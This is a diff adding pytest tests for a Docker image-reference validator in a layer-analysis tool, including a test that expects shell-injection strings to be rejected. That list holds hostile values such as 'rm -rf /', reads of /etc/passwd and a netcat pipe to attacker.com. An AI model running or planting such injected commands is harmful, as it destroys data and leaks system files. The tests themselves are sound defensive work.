@@ -883,3 +883,86 @@ RUN echo hello
         with patch('shutil.which', return_value=None):
             analyzer = LayerAnalyzer()
             assert not analyzer.is_available()
+
+
+class TestImageReferenceValidation:
+    """Tests for image reference validation security checks."""
+
+    def test_valid_image_references(self):
+        """Test that valid image references pass validation."""
+        analyzer = LayerAnalyzer()
+        valid_refs = [
+            "nginx:latest",
+            "python:3.11",
+            "gcr.io/project/image:v1.0",
+            "docker.io/library/alpine:3.19",
+            "registry.example.com:5000/my-image:tag",
+            "image@sha256:abcdef1234567890",
+            "my-registry/my-image:1.2.3-alpha",
+            "ghcr.io/org/repo:feature-branch",
+            "a",  # Single character is valid
+        ]
+        for ref in valid_refs:
+            # Should not raise
+            analyzer._validate_image_reference(ref)
+
+    def test_empty_image_reference(self):
+        """Test that empty image reference is rejected."""
+        analyzer = LayerAnalyzer()
+        with pytest.raises(ValueError, match="cannot be empty"):
+            analyzer._validate_image_reference("")
+
+    def test_null_byte_in_reference(self):
+        """Test that null bytes in image reference are rejected."""
+        analyzer = LayerAnalyzer()
+        with pytest.raises(ValueError, match="invalid characters"):
+            analyzer._validate_image_reference("nginx:latest\x00malicious")
+
+    def test_newline_in_reference(self):
+        """Test that newlines in image reference are rejected."""
+        analyzer = LayerAnalyzer()
+        with pytest.raises(ValueError, match="invalid characters"):
+            analyzer._validate_image_reference("nginx:latest\nmalicious")
+        with pytest.raises(ValueError, match="invalid characters"):
+            analyzer._validate_image_reference("nginx:latest\rmalicious")
+
+    def test_too_long_reference(self):
+        """Test that overly long image references are rejected."""
+        analyzer = LayerAnalyzer()
+        long_ref = "a" * 513
+        with pytest.raises(ValueError, match="exceeds maximum length"):
+            analyzer._validate_image_reference(long_ref)
+
+    def test_shell_metacharacters_rejected(self):
+        """Test that shell metacharacters are rejected."""
+        analyzer = LayerAnalyzer()
+        malicious_refs = [
+            "nginx; rm -rf /",
+            "nginx && cat /etc/passwd",
+            "nginx | nc attacker.com 1234",
+            "nginx`whoami`",
+            "$(cat /etc/passwd)",
+            "nginx > /tmp/output",
+            "nginx < /etc/passwd",
+            "nginx*",
+            "nginx?tag",
+            "nginx[1]",
+            "nginx{a,b}",
+            "nginx!test",
+            "nginx$HOME",
+            "nginx 'quoted'",
+            'nginx "double quoted"',
+        ]
+        for ref in malicious_refs:
+            with pytest.raises(ValueError, match="Invalid image reference"):
+                analyzer._validate_image_reference(ref)
+
+    def test_reference_starting_with_special_char(self):
+        """Test that references not starting with alphanumeric are rejected."""
+        analyzer = LayerAnalyzer()
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            analyzer._validate_image_reference("-nginx:latest")
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            analyzer._validate_image_reference(".nginx:latest")
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            analyzer._validate_image_reference("_nginx:latest")
